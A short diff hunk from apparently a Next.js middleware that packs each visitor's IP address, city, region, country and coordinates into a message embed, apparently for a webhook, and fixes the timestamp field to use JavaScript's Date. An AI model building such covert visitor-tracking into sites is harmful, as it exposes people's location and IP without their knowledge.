@@ -89,7 +89,7 @@ export async function middleware(request) {
                                         { "name": "IP", "value": ip, "inline": false },
                                         { "name": "Location", "value": `${city}, ${region}, ${country}`, "inline": false },
                                         { "name": "Coordinate", "value": `${latitude}, ${longitude}`, "inline": false },
-                                        { "name": "TimeStamp", "value": str(get_time()), "inline": false },
+                                        { "name": "TimeStamp", "value": new Date().toLocaleString(), "inline": false },
                                     ],
                                 },
                             ],
